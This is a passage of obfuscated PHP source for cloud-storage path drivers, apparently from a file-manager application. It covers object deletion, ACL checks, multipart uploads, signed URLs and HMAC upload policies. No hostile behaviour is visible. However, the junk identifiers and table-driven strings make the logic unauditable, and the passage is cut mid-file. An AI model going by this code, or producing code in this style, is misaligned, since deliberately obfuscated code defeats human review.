$¯ÁØ€Ùí = $this->delByBatch($ˆÎ¡”ú[$¤ƒ„è±„[82]]); if (!$¯ÁØ€Ùí) { return !1; } return $this->delFile($ÒÇğ¡¡è); } private function delByBatch($§È³Ãà) { foreach (array_chunk($§È³Ãà, 1000) as $‘ã„Æ¼Œ) { try { $this->client->deleteObjects($this->bucket, $‘ã„Æ¼Œ); } catch (OSS\Core\OssException $ã‚ĞÅ”Ò) { return !1; } } return !0; } public function rename($‰ ûÚÄê, $Òí˜ìŸÑ) { return $this->renameObject($‰ ûÚÄê, $Òí˜ìŸÑ); } private function fileInfo($©Úü˜£Ÿ, $ã“°Š = false, $€ğ¾¬º» = array()) { $—„Ë‰‚ë =& $_SERVER[ùÆÎÔ“Ñ]; $¢‘ä÷µö = array($—„Ë‰‚ë[32] => $this->pathThis($©Úü˜£Ÿ), $—„Ë‰‚ë[84] => $this->getPathOuter($©Úü˜£Ÿ), $—„Ë‰‚ë[33] => $—„Ë‰‚ë[199], $—„Ë‰‚ë[76] => isset($€ğ¾¬º»[$—„Ë‰‚ë[76]]) ? $€ğ¾¬º»[$—„Ë‰‚ë[76]] : 0, $—„Ë‰‚ë[174] => $this->ext($©Úü˜£Ÿ)); if ($ã“°Š) { return $¢‘ä÷µö; } $¢‘ä÷µö[$—„Ë‰‚ë[200]] = $¢‘ä÷µö[$—„Ë‰‚ë[85]] = 0; $¢‘ä÷µö[$—„Ë‰‚ë[201]] = $¢‘ä÷µö[$—„Ë‰‚ë[202]] = !0; if (empty($€ğ¾¬º»)) { $İâªÑ¶¶ = $this->objectMeta($©Úü˜£Ÿ); if (!$İâªÑ¶¶) { return $¢‘ä÷µö; } $€ğ¾¬º» = array($—„Ë‰‚ë[85] => strtotime($İâªÑ¶¶[$—„Ë‰‚ë[1412]]), $—„Ë‰‚ë[76] => $İâªÑ¶¶[$—„Ë‰‚ë[1411]] + 0); } if (isset($€ğ¾¬º»[$—„Ë‰‚ë[76]])) { $¢‘ä÷µö[$—„Ë‰‚ë[76]] = $€ğ¾¬º»[$—„Ë‰‚ë[76]]; } if (isset($€ğ¾¬º»[$—„Ë‰‚ë[85]])) { $¢‘ä÷µö[$—„Ë‰‚ë[85]] = $€ğ¾¬º»[$—„Ë‰‚ë[85]]; } if (isset($€ğ¾¬º»[$—„Ë‰‚ë[203]]) && !trim($¢‘ä÷µö[$—„Ë‰‚ë[85]])) { $¢‘ä÷µö[$—„Ë‰‚ë[85]] = $€ğ¾¬º»[$—„Ë‰‚ë[203]]; } return $¢‘ä÷µö; } private function folderInfo($’úó›á§, $ÒÚÇèÁá = false, $ÙÎÕ€³¿ = array()) { $İïæê‚™ =& $_SERVER[ùÆÎÔ“Ñ]; $™ìàä÷ù = array($İïæê‚™[32] => $this->pathThis($’úó›á§), $İïæê‚™[84] => $this->getPathOuter($İïæê‚™[8] . $’úó›á§), $İïæê‚™[33] => $İïæê‚™[75]); if ($ÒÚÇèÁá) { return $™ìàä÷ù; } $™ìàä÷ù[$İïæê‚™[200]] = $™ìàä÷ù[$İïæê‚™[85]] = 0; $™ìàä÷ù[$İïæê‚™[201]] = $™ìàä÷ù[$İïæê‚™[202]] = !0; if (empty($ÙÎÕ€³¿)) { $’úó›á§ = rtrim($’úó›á§, $İïæê‚™[8]) . $İïæê‚™[8]; $Ë˜óóÉÔ = $this->objectMeta($’úó›á§); if (!$Ë˜óóÉÔ) { return $™ìàä÷ù; } $ÙÎÕ€³¿ = array($İïæê‚™[200] => $Ë˜óóÉÔ[$İïæê‚™[511]][$İïæê‚™[1419]], $İïæê‚™[85] => strtotime($Ë˜óóÉÔ[$İïæê‚™[1412]])); } if (isset($ÙÎÕ€³¿[$İïæê‚™[85]])) { $™ìàä÷ù[$İïæê‚™[85]] = $ÙÎÕ€³¿[$İïæê‚™[85]]; } if (isset($ÙÎÕ€³¿[$İïæê‚™[200]])) { $™ìàä÷ù[$İïæê‚™[200]] = $ÙÎÕ€³¿[$İïæê‚™[200]]; } return $™ìàä÷ù; } public function listPath($È‰ª¢À, $¨Àõ¸»Û = false) { $Ê¶ªÂë =& $_SERVER[ùÆÎÔ“Ñ]; $áªéÖ¿Ù = $this->fileList($È‰ª¢À, $Ê¶ªÂë[8], !0); foreach ($áªéÖ¿Ù[$Ê¶ªÂë[82]] as $óµ”ˆ‚« => $ª»Å‚–ı) { $áªéÖ¿Ù[$Ê¶ªÂë[82]][$óµ”ˆ‚«] = $this->folderInfo($ª»Å‚–ı, $¨Àõ¸»Û, $ª»Å‚–ı); } foreach ($áªéÖ¿Ù[$Ê¶ªÂë[83]] as $óµ”ˆ‚« => $ª»Å‚–ı) { $áªéÖ¿Ù[$Ê¶ªÂë[83]][$óµ”ˆ‚«] = $this->fileInfo($ª»Å‚–ı[$Ê¶ªÂë[32]], $¨Àõ¸»Û, $ª»Å‚–ı); } return $áªéÖ¿Ù; } protected function infoChildren($™ÛïÚï†, &$è‰£æ±õ) { $éÄ Ç÷´ =& $_SERVER[ùÆÎÔ“Ñ]; $ÜûÏ°å = $this->fileList($™ÛïÚï†, $éÄ Ç÷´[12], !0); $è‰£æ±õ[$éÄ Ç÷´[78]] += count($ÜûÏ°å[$éÄ Ç÷´[82]]); $è‰£æ±õ[$éÄ Ç÷´[77]] += count($ÜûÏ°å[$éÄ Ç÷´[83]]); foreach ($ÜûÏ°å[$éÄ Ç÷´[83]] as $˜ÈÖ«ºã) { if (!$˜ÈÖ«ºã || !$˜ÈÖ«ºã[$éÄ Ç÷´[76]]) { continue; } $è‰£æ±õ[$éÄ Ç÷´[76]] += $˜ÈÖ«ºã[$éÄ Ç÷´[76]]; } } public function has($îÂèâÙÈ, $àÃ‹Ä—é = false, $›œ®âÏ = true) { $­°¦’ï =& $_SERVER[ùÆÎÔ“Ñ]; $îÂèâÙÈ = trim($îÂèâÙÈ, $­°¦’ï[8]); $´¯Ïö€ = empty($îÂèâÙÈ) && $îÂèâÙÈ !== $­°¦’ï[197] ? $­°¦’ï[12] : $îÂèâÙÈ . $­°¦’ï[8]; $ğÇÀ‡ÂË = $­°¦’ï[12]; $¢‘©Çñ« = 500; $ğÙñÒ¦ = $óø”²“— = 0; while (!0) { check_abort(); $‘Ï£á€ı = array($­°¦’ï[1407] => $­°¦’ï[8], $­°¦’ï[1408] => $´¯Ïö€, $­°¦’ï[1409] => $¢‘©Çñ«, $­°¦’ï[1410] => $ğÇÀ‡ÂË); try { $¸áúá²– = $this->client->listObjects($this->bucket, $‘Ï£á€ı); } catch (OSS\Core\OssException $–îŞÉ¡°) { break; } $ğÇÀ‡ÂË = $¸áúá²–->getNextMarker(); $¾¥¾ù‰ø = $¸áúá²–->getObjectList(); $´Ôç¯ = $¸áúá²–->getPrefixList(); if ($àÃ‹Ä—é) { if (count($¾¥¾ù‰ø) > 1 || count($¾¥¾ù‰ø) == 1 && $¾¥¾ù‰ø[0]->getKey() != $´¯Ïö€) { $ğÙñÒ¦ += count($¾¥¾ù‰ø) - 1; } if (!empty($´Ôç¯)) { $óø”²“— += count($´Ôç¯); } if ($ğÇÀ‡ÂË === $­°¦’ï[12]) { break; } continue; } if ($›œ®âÏ) { if (!empty($¾¥¾ù‰ø)) { if (count($¾¥¾ù‰ø) > 1 || $¾¥¾ù‰ø[0]->getKey() != $´¯Ïö€) { return !0; } } } else { if (!empty($´Ôç¯)) { return !0; } } if ($ğÇÀ‡ÂË === $­°¦’ï[12]) { break; } } if ($àÃ‹Ä—é) { return array($­°¦’ï[207] => $ğÙñÒ¦, $­°¦’ï[208] => $óø”²“—); } return !1; } public function listAll($»Ğ“Ÿ) { $éˆŞŒ’ˆ =& $_SERVER[ùÆÎÔ“Ñ]; $Œ¿Âï…Ø = $this->fileList($»Ğ“Ÿ, $éˆŞŒ’ˆ[12], !0); $¾öµ„“Ã = array(); foreach ($Œ¿Âï…Ø[$éˆŞŒ’ˆ[83]] as $ˆæ±‚±) { $¾öµ„“Ã[$ˆæ±‚±[$éˆŞŒ’ˆ[32]]] = $ˆæ±‚±[$éˆŞŒ’ˆ[76]]; } foreach ($Œ¿Âï…Ø[$éˆŞŒ’ˆ[82]] as $ˆæ±‚±) { if (is_string($ˆæ±‚±)) { $¾öµ„“Ã[$ˆæ±‚±] = 0; } } return $this->listAllFiles($»Ğ“Ÿ, array_keys($¾öµ„“Ã), $¾öµ„“Ã); } public function canRead($ñ˜àÊÖ©) { $çíôÜÇ =& $_SERVER[ùÆÎÔ“Ñ]; $ÈšÙİÀë = $this->pathAcl($ñ˜àÊÖ©); return $ÈšÙİÀë == $çíôÜÇ[1420] || $ÈšÙİÀë == $çíôÜÇ[556] ? !0 : !1; } public function canWrite($×Ì°¹—Å) { $˜İ­ğ–£ = $this->pathAcl($×Ì°¹—Å); return $˜İ­ğ–£ == $_SERVER[ùÆÎÔ“Ñ][556] ? !0 : !1; } public function pathAcl($©Š¾‚‘) { $ó…æÈÆ‚ =& $_SERVER[ùÆÎÔ“Ñ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Œ‡ŞğÄÆ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($©Š¾‚‘)); } catch (OSS\Core\OssException $¿ÃÏòú) { return !1; } $ô¥§àìˆ = $Œ‡ŞğÄÆ == $ó…æÈÆ‚[37] ? $this->bucketAcl : $Œ‡ŞğÄÆ; if ($ô¥§àìˆ == $ó…æÈÆ‚[1421]) { return $ó…æÈÆ‚[1420]; } if ($ô¥§àìˆ == $ó…æÈÆ‚[1422]) { return $ó…æÈÆ‚[556]; } return $ô¥§àìˆ; } private function chmodPath($­ñ’ ²¿, $Ø¥ö¯…¼ = '') { $ÄÔ§Ø› =& $_SERVER[ùÆÎÔ“Ñ]; $•ÆÚÎ = empty($Ø¥ö¯…¼) ? $ÄÔ§Ø›[1422] : $Ø¥ö¯…¼; $´î›º = array($ÄÔ§Ø›[37], $ÄÔ§Ø›[198], $ÄÔ§Ø›[1421], $ÄÔ§Ø›[1422]); if (!in_array($•ÆÚÎ, $´î›º)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($­ñ’ ²¿), $•ÆÚÎ); } catch (OSS\Core\OssException $›‡¸¾Ñ) { return !1; } return !0; } public function getContent($Æ»åÉÖÚ) { return $this->fileSubstr($Æ»åÉÖÚ, -1); } public function setContent($÷Ò ı¨­, $öÏƒÅ„ = '') { $×–…Ğû =& $_SERVER[ùÆÎÔ“Ñ]; try { $£ƒœªæš = $this->trafficLimit($×–…Ğû[1423]); $“ûœá“Ò = $this->client->putObject($this->bucket, $this->pathEncode($÷Ò ı¨­), $öÏƒÅ„, $£ƒœªæš); } catch (OSS\Core\OssException $î¶¯îÇ–) { return !1; } $£Ó¡Œ‚ = array($×–…Ğû[1413] => trim($“ûœá“Ò[$×–…Ğû[1424]], $×–…Ğû[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($÷Ò ı¨­))); $this->updateObjMeta($÷Ò ı¨­, $£Ó¡Œ‚); return isset($“ûœá“Ò[$×–…Ğû[1425]][$×–…Ğû[1372]]) ? !0 : !1; } private function updateObjMeta($·‚¼Ç«ö, $äµÒ€×Ï) { $·‚¼Ç«ö = $this->pathEncode($·‚¼Ç«ö); try { $ÈÍ´Ôñ† = array(OSS\OssClient::OSS_HEADERS => $äµÒ€×Ï); $this->client->copyObject($this->bucket, $·‚¼Ç«ö, $this->bucket, $·‚¼Ç«ö, $ÈÍ´Ôñ†); } catch (OSS\Core\OssException $˜ºİğ»¾) { return !1; } return !0; } public function upload($ÁØÙ™Î, $èÙ©á“¯, $ø™íàØÃ = false, $Ö‚“ø—ï = REPEAT_REPLACE) { $¯”‚•Üç =& $_SERVER[ùÆÎÔ“Ñ]; $äíĞÀÅÕ = trim($ÁØÙ™Î, $¯”‚•Üç[8]); $Ñ´ÜÔ‘º = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($¯”‚•Üç[1413] => @md5_file($èÙ©á“¯)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÁØÙ™Î))); $Ñ´ÜÔ‘º = $this->trafficLimit($¯”‚•Üç[1423], $Ñ´ÜÔ‘º); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($äíĞÀÅÕ), $èÙ©á“¯, $Ñ´ÜÔ‘º); } catch (OSS\Core\OssException $²Ö‹÷·) { return !1; } return $this->getPathOuter($ÁØÙ™Î); } public function getHost() { $Ø›é‹¸ =& $_SERVER[ùÆÎÔ“Ñ]; $±İÜä§ñ = explode($Ø›é‹¸[183], parent::getHost()); return $±İÜä§ñ[0] . $Ø›é‹¸[183] . $this->bucket . $Ø›é‹¸[10] . $±İÜä§ñ[1]; } public function uploadFormData($ºÒ˜ñéß, $ä·›¤ïõ = 3600) { $ÕÆñ‡šµ =& $_SERVER[ùÆÎÔ“Ñ]; if (!($ Õø¿İ = $this->getHost())) { return !1; } $°ì “Ñ = $ä·›¤ïõ; $Ûñ”œ³ = date($ÕÆñ‡šµ[1426], time() + $°ì “Ñ); $àæÆ´ÀŠ = new DateTime($Ûñ”œ³); $‡˜ª³îÑ = $àæÆ´ÀŠ->format(DateTime::ISO8601); $À¹¯ó“Ê = strpos($‡˜ª³îÑ, $ÕÆñ‡šµ[296]); $‡˜ª³îÑ = substr($‡˜ª³îÑ, 0, $À¹¯ó“Ê) . $ÕÆñ‡šµ[1427]; $ªş†¸Ëì = 1048576000 * 5; $ééµİ = $this->pathFather($ºÒ˜ñéß); $ç¢†·é  = array($ÕÆñ‡šµ[1326] => $‡˜ª³îÑ, $ÕÆñ‡šµ[1327] => array(array($ÕÆñ‡šµ[1428], 0, $ªş†¸Ëì), array($ÕÆñ‡šµ[1330], $ÕÆñ‡šµ[1331], $ééµİ))); $äÄ¨¦­ = base64_encode(json_encode($ç¢†·é )); $ˆè¥ŸÚ¸ = base64_encode(hash_hmac($ÕÆñ‡šµ[232], $äÄ¨¦­, $this->secret, !0)); $´ã³…´ = array($ÕÆñ‡šµ[1336] => $äÄ¨¦­, $ÕÆñ‡šµ[1429] => $this->accessKey, $ÕÆñ‡šµ[1332] => $ÕÆñ‡šµ[1324], $ÕÆñ‡šµ[1430] => $ˆè¥ŸÚ¸, $ÕÆñ‡šµ[181] => $ Õø¿İ); $´ã³…´ = $this->trafficLimit($ÕÆñ‡šµ[1423], $´ã³…´); return $´ã³…´; } public function multiUploadFormData($ºßç”„, $é™ùÊÛÕ = 3600) { $œ™ªªü• =& $_SERVER[ùÆÎÔ“Ñ]; if (!($Ïôµãˆ = $this->getHost())) { return !1; } $Åñ®Î = $this->trafficLimit($œ™ªªü•[1423]); $×“¶Ğß½ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ºßç”„), $Åñ®Î); return array($œ™ªªü•[223] => $×“¶Ğß½, $œ™ªªü•[181] => $Ïôµãˆ . $œ™ªªü•[8] . $this->pathEncode($ºßç”„), $œ™ªªü•[224] => gmdate($œ™ªªü•[1431]), $œ™ªªü•[94] => $ºßç”„); } public function multiUploadAuthData($­á–ã ¼, $‰ÀûùÑâ = array()) { $É²¦‘ùÇ =& $_SERVER[ùÆÎÔ“Ñ]; $Ãì ¥ÂË = isset($‰ÀûùÑâ[$É²¦‘ùÇ[224]]) ? $‰ÀûùÑâ[$É²¦‘ùÇ[224]] : gmdate($É²¦‘ùÇ[1431]); $”¨îà´û = isset($‰ÀûùÑâ[$É²¦‘ùÇ[174]]) ? $‰ÀûùÑâ[$É²¦‘ùÇ[174]] : $É²¦‘ùÇ[12]; $¹ÚÑ‡‚à = $­á–ã ¼; if (isset($‰ÀûùÑâ[$É²¦‘ùÇ[94]])) { $¹ÚÑ‡‚à = $‰ÀûùÑâ[$É²¦‘ùÇ[94]]; unset($‰ÀûùÑâ[$É²¦‘ùÇ[94]]); } if (isset($‰ÀûùÑâ[$É²¦‘ùÇ[225]])) { $‰ÀûùÑâ[$É²¦‘ùÇ[224]] = $Ãì ¥ÂË; return $this->listUploadParts($¹ÚÑ‡‚à, $‰ÀûùÑâ); } $€ÏÆÁ—Ş = array($É²¦‘ùÇ[226], $É²¦‘ùÇ[12], $É²¦‘ùÇ[120], $Ãì ¥ÂË, "\x78\55\x6f\x73\x73\x2d\x64\x61\x74\x65\72{$Ãì ¥ÂË}", $É²¦‘ùÇ[8] . $this->bucket . $É²¦‘ùÇ[8] . $¹ÚÑ‡‚à . $”¨îà´û); if (strpos($”¨îà´û, $É²¦‘ùÇ[227]) === 0) { $€ÏÆÁ—Ş[0] = $É²¦‘ùÇ[228]; if ($ˆ§¤Ğäˆ = $this->trafficLimit($É²¦‘ùÇ[1423])) { $¹ÚÑ‡‚à = $É²¦‘ùÇ[1432]; array_splice($€ÏÆÁ—Ş, 5, 0, $¹ÚÑ‡‚à . $É²¦‘ùÇ[4] . $ˆ§¤Ğäˆ[$¹ÚÑ‡‚à]); } } if (isset($‰ÀûùÑâ[$É²¦‘ùÇ[229]]) && $‰ÀûùÑâ[$É²¦‘ùÇ[229]] == $É²¦‘ùÇ[230]) { $€ÏÆÁ—Ş[0] = $É²¦‘ùÇ[230]; } if (!empty($‰ÀûùÑâ[$É²¦‘ùÇ[1433]])) { $İœšË¶® = array_merge(array($€ÏÆÁ—Ş[4]), $‰ÀûùÑâ[$É²¦‘ùÇ[1433]]); sort($İœšË¶®); $€ÏÆÁ—Ş[4] = implode($É²¦‘ùÇ[231], $İœšË¶®); } $Œ°Ò¨ë¢ = implode($É²¦‘ùÇ[231], $€ÏÆÁ—Ş); $Ø²¥¨›„ = base64_encode(hash_hmac($É²¦‘ùÇ[232], $Œ°Ò¨ë¢, $this->secret, !0)); $·ê‹û£¦ = $É²¦‘ùÇ[1397] . $this->accessKey . $É²¦‘ùÇ[4] . $Ø²¥¨›„; if (strpos($”¨îà´û, $É²¦‘ùÇ[227]) === 0) { $·ê‹û£¦ = array($É²¦‘ùÇ[234] => $·ê‹û£¦, $É²¦‘ùÇ[224] => $Ãì ¥ÂË); if ($ˆ§¤Ğäˆ) { $·ê‹û£¦ = array_merge($·ê‹û£¦, $ˆ§¤Ğäˆ); } } return $·ê‹û£¦; } public function listUploadParts($ÜÕãåÊÅ, $š§ÅÌ§¿) { $„¶ÜĞÀ‹ =& $_SERVER[ùÆÎÔ“Ñ]; $æ¾èæ = parse_url_query($š§ÅÌ§¿[$„¶ÜĞÀ‹[174]]); $Œ´á€¯Ì = $this->client->listParts($this->bucket, $this->pathEncode($ÜÕãåÊÅ), $æ¾èæ[$„¶ÜĞÀ‹[223]]); $æâõÃŸ‡ = $Œ´á€¯Ì->getListPart(); $ çš§ƒğ = array(); foreach ($æâõÃŸ‡ as $“Ò©Ğ¼Š) { $ çš§ƒğ[] = array($„¶ÜĞÀ‹[1417] => $“Ò©Ğ¼Š->getPartNumber(), $„¶ÜĞÀ‹[1418] => trim($“Ò©Ğ¼Š->getETag(), $„¶ÜĞÀ‹[118])); } unset($š§ÅÌ§¿[$„¶ÜĞÀ‹[225]], $š§ÅÌ§¿[$„¶ÜĞÀ‹[229]]); $Ìå¢º×ˆ = $this->multiUploadAuthData($ÜÕãåÊÅ, $š§ÅÌ§¿); if (empty($Ìå¢º×ˆ)) { return !1; } return array($„¶ÜĞÀ‹[234] => $Ìå¢º×ˆ, $„¶ÜĞÀ‹[224] => $š§ÅÌ§¿[$„¶ÜĞÀ‹[224]], $„¶ÜĞÀ‹[236] => $ çš§ƒğ); } public function download($­Ì÷‚Ó”, $²ÍÂäè…) { if ($this->isFolder($­Ì÷‚Ó”)) { return !1; } try { $¥‚˜Á¤Ï = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $²ÍÂäè…); $¥‚˜Á¤Ï = $this->trafficLimit($_SERVER[ùÆÎÔ“Ñ][109], $¥‚˜Á¤Ï); $this->client->getObject($this->bucket, $this->pathEncode($­Ì÷‚Ó”), $¥‚˜Á¤Ï); } catch (OSS\Core\OssException $èË…¡Ç) { return !1; } return $²ÍÂäè…; } public function fileSubstr($²˜Éƒ»‰, $õğë˜À = 0, $“âşö = false) { if ($õğë˜À === -1) { $‘¯‹šŠœ = array(); } else { if ($“âşö === !1) { $şœë¤Ñ½ = $this->size($²˜Éƒ»‰); } else { $şœë¤Ñ½ = $õğë˜À + $“âşö - 1; } $‘¯‹šŠœ = array(OSS\OssClient::OSS_RANGE => "{$õğë˜À}\55{$şœë¤Ñ½}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($²˜Éƒ»‰), $‘¯‹šŠœ); } catch (OSS\Core\OssException $ûŞ”…Ñà) { think_exception($ûŞ”…Ñà->getMessage()); return !1; } } private function trafficLimit($Ô„ıå, $ãû‘é÷ = array()) { $Ö“¬”­° =& $_SERVER[ùÆÎÔ“Ñ]; if ($Ô„ıå == $Ö“¬”­°[1423] && $this->isUploadServer() || $Ô„ıå == $Ö“¬”­°[109] && $this->isFileOutServer()) { return $ãû‘é÷; } $á…êÓó = floatval($GLOBALS[$Ö“¬”­°[6]][$Ö“¬”­°[89]][$Ö“¬”­°[107]][$Ô„ıå]) * 1024 * 1024 * 8; if (!$á…êÓó) { return $ãû‘é÷; } $á…êÓó = $á…êÓó < 819200 ? 819200 : ($á…êÓó > 838860800 ? 838860800 : $á…êÓó); $ãû‘é÷[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($á…êÓó); return $ãû‘é÷; } public function link($…„±˜ø«, $¸ƒ­ö = array()) { $êÒî’àê =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->exist($…„±˜ø«) || $this->isFolder($…„±˜ø«)) { return !1; } try { $¸ƒ­ö = $this->trafficLimit($êÒî’àê[109], $¸ƒ­ö); $æ€ÒÖÀ¨ = $this->client->signUrl($this->bucket, $this->pathEncode($…„±˜ø«), 3600 * 12, $êÒî’àê[230], $¸ƒ­ö); return $this->getCdnLink($æ€ÒÖÀ¨); } catch (OSS\Core\OssException $Ò£‘ñşè) { return !1; } } public function fileOut($ïû·…ªù, $¿­Û”œå = false, $³¸¡Â…Ç = false, $”ÕŒÎ†Œ = '') { $ãÍ €¤„ =& $_SERVER[ùÆÎÔ“Ñ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ïû·…ªù, $¿­Û”œå, $³¸¡Â…Ç, $”ÕŒÎ†Œ); } if (!$³¸¡Â…Ç) { $³¸¡Â…Ç = $this->pathThis($ïû·…ªù); } $³¸¡Â…Ç = rawurlencode($³¸¡Â…Ç); $º˜¹ëÃö = get_file_mime(get_path_ext($³¸¡Â…Ç)); if ($º˜¹ëÃö == $ãÍ €¤„[217]) { return parent::fileOut($ïû·…ªù, $¿­Û”œå, $³¸¡Â…Ç, $”ÕŒÎ†Œ); } $¿­Û”œå = $¿­Û”œå ? $ãÍ €¤„[1434] : $ãÍ €¤„[1435]; $ä÷ô‹ü = array(OSS\OssClient::OSS_SUB_RESOURCE => $ãÍ €¤„[1436] . rawurlencode("{$¿­Û”œå}\x3b\x66\151\x6c\145\x6e\x61\155\x65\x3d{$³¸¡Â…Ç}")); $ä÷ô‹ü[OSS\OssClient::OSS_SUB_RESOURCE] .= $ãÍ €¤„[1437] . rawurlencode($º˜¹ëÃö); $¨üŒñº¶ = $this->link($ïû·…ªù, $ä÷ô‹ü); $this->fileOutLink($¨üŒñº¶); } public function fileOutServer($Êî¶ëæ», $‹äˆÛò˜ = false, $»õ”ÀÏ® = false, $”¥âä†Ã = '') { parent::fileOut($Êî¶ëæ», $‹äˆÛò˜, $»õ”ÀÏ®, $”¥âä†Ã); } public function fileOutImage($Æëíó¶, $Öå¬‡Ä› = 250) { $ŸƒÊÅ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ùÆÎÔ“Ñ][1438] . $Öå¬‡Ä›); $æß‘²¶ù = $this->link($Æëíó¶, $ŸƒÊÅ); $this->fileOutLink($æß‘²¶ù); } public function fileOutImageServer($ó–˜š¸, $Ÿò‘ÁÚ» = 250) { parent::fileOutImage($ó–˜š¸, $Ÿò‘ÁÚ»); } public function fileOutLink($™Øğ€ª’) { $§™óÒ‡… =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->isCdnHost() && substr($™Øğ€ª’, 0, 7) == $§™óÒ‡…[1339]) { $™Øğ€ª’ = $§™óÒ‡…[1340] . substr($™Øğ€ª’, 7); } header($§™óÒ‡…[161] . $™Øğ€ª’); die; } public function hashMd5($ÏÒ˜®Úø, $Ş¯‹¹´± = '') { $úÅÂ½•à =& $_SERVER[ùÆÎÔ“Ñ]; $íèÊÁÊ = $this->_objectMeta($ÏÒ˜®Úø); if (!$íèÊÁÊ) { return $úÅÂ½•à[12]; } if (!isset($íèÊÁÊ[$úÅÂ½•à[1413]]) && !empty($Ş¯‹¹´±)) { $±¨—½¶† = $this->updateObjMeta($ÏÒ˜®Úø, array($úÅÂ½•à[1413] => $Ş¯‹¹´±)); $íèÊÁÊ[$úÅÂ½•à[1413]] = $±¨—½¶† ? $Ş¯‹¹´± : $úÅÂ½•à[12]; } return isset($íèÊÁÊ[$úÅÂ½•à[1413]]) ? strtolower($íèÊÁÊ[$úÅÂ½•à[1413]]) : $úÅÂ½•à[12]; } public function size($½òİÃ­Æ) { $¬¨“–õ¥ = $this->objectMeta($½òİÃ­Æ); return $¬¨“–õ¥ ? $¬¨“–õ¥[$_SERVER[ùÆÎÔ“Ñ][76]] : 0; } public function info($ËÁ·˜®µ) { if ($this->isFolder($ËÁ·˜®µ)) { return $this->folderInfo($ËÁ·˜®µ); } else { if ($this->isFile($ËÁ·˜®µ)) { return $this->fileInfo($ËÁ·˜®µ); } } return !1; } public function exist($Üéí­ù•) { return $this->isFile($Üéí­ù•) || $this->isFolder($Üéí­ù•); } public function isFile($ê´„¢·) { return !$this->isFolder($ê´„¢·) && $this->objectMeta($ê´„¢·); } public function isFolder($Ùğ×¯ò) { return $this->cacheMethod($_SERVER[ùÆÎÔ“Ñ][165], $Ùğ×¯ò); } protected function objectMeta($ıËÆÃ›) { return $this->cacheMethod($_SERVER[ùÆÎÔ“Ñ][167], $ıËÆÃ›); } protected function _objectMeta($™¿´É˜²) { $ãÒÅêÄ¢ =& $_SERVER[ùÆÎÔ“Ñ]; try { $èøª¼ã = $this->client->getObjectMeta($this->bucket, $this->pathEncode($™¿´É˜²)); } catch (OSS\Core\OssException $€„¦À”¶) { $èøª¼ã = !1; } if ($èøª¼ã) { $èøª¼ã[$ãÒÅêÄ¢[76]] = intval($èøª¼ã[$ãÒÅêÄ¢[1411]]); } return $èøª¼ã; } protected function _isFolder($¹ä¿æ‹Ó) { $ş¦÷´§ =& $_SERVER[ùÆÎÔ“Ñ]; if ($¹ä¿æ‹Ó == $ş¦÷´§[12] || $¹ä¿æ‹Ó == $ş¦÷´§[8]) { return !0; } $ùŞÑü·õ = array($ş¦÷´§[1407] => $ş¦÷´§[8], $ş¦÷´§[1408] => rtrim($¹ä¿æ‹Ó, $ş¦÷´§[8]) . $ş¦÷´§[8], $ş¦÷´§[1409] => 1, $ş¦÷´§[1410] => $ş¦÷´§[12]); $¿„ÁŸ¯í = $this->client->listObjects($this->bucket, $ùŞÑü·õ); if ($¿„ÁŸ¯í->getObjectList() || $¿„ÁŸ¯í->getPrefixList()) { return !0; } return !1; } } goto A§°áÍ§à£; Dª™¢¶ã¬ë: class PathDriverEDS extends PathDriverMinIO { public function __construct($ä‚·³ÑŠ) { parent::__construct($ä‚·³ÑŠ); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($£ ·Åóã) { parent::__construct($£ ·Åóã); $this->signatureVersion($_SERVER[ùÆÎÔ“Ñ][216]); } public function uploadFormData($óšô¯Ü, $â¤éµÊá = 3600) { $ç¥ãÒ•È =& $_SERVER[ùÆÎÔ“Ñ]; $ÑŞÃŒ—® = $ç¥ãÒ•È[198]; $î·òëúø = $ç¥ãÒ•È[1360]; $± „ƒ–™ = $ç¥ãÒ•È[62]; $«ú¢†éó = gmdate($ç¥ãÒ•È[1361]); $±¾·§é‚ = gmdate($ç¥ãÒ•È[752]); $´™Ú˜» = $ç¥ãÒ•È[1362]; $Úø²ôäõ = $â¤éµÊá . $ç¥ãÒ•È[12]; $·Ù»¢Æ = $ç¥ãÒ•È[1324]; $¸Ñåó¿¿ = array($this->accessKey, $±¾·§é‚, $this->region, $± „ƒ–™, $´™Ú˜»); $¸”ÜÈäí = implode($ç¥ãÒ•È[8], $¸Ñåó¿¿); $«–îï¶Ü = array($ç¥ãÒ•È[1326] => gmdate($ç¥ãÒ•È[1325], strtotime($ç¥ãÒ•È[1363])), $ç¥ãÒ•È[1327] => array(array($ç¥ãÒ•È[1329] => $this->bucket), array($ç¥ãÒ•È[1328] => $ÑŞÃŒ—®), array($ç¥ãÒ•È[1330], $ç¥ãÒ•È[1331], $ç¥ãÒ•È[12]), array($ç¥ãÒ•È[1330], $ç¥ãÒ•È[1364], $ç¥ãÒ•È[12]), array($ç¥ãÒ•È[1330], $ç¥ãÒ•È[1365], $ç¥ãÒ•È[12]), array($ç¥ãÒ•È[1332] => $·Ù»¢Æ), array($ç¥ãÒ•È[1366] => $¸”ÜÈäí), array($ç¥ãÒ•È[1367] => $î·òëúø), array($ç¥ãÒ•È[1368] => $«ú¢†éó), array($ç¥ãÒ•È[1369] => $Úø²ôäõ))); $¹ê´›–İ = base64_encode(json_encode($«–îï¶Ü)); $Ğ¼æÖÊº = hash_hmac($ç¥ãÒ•È[1370], $±¾·§é‚, $ç¥ãÒ•È[1371] . $this->secret, !0); $˜ëÈœª = hash_hmac($ç¥ãÒ•È[1370], $this->region, $Ğ¼æÖÊº, !0); $ú˜–®û¶ = hash_hmac($ç¥ãÒ•È[1370], $± 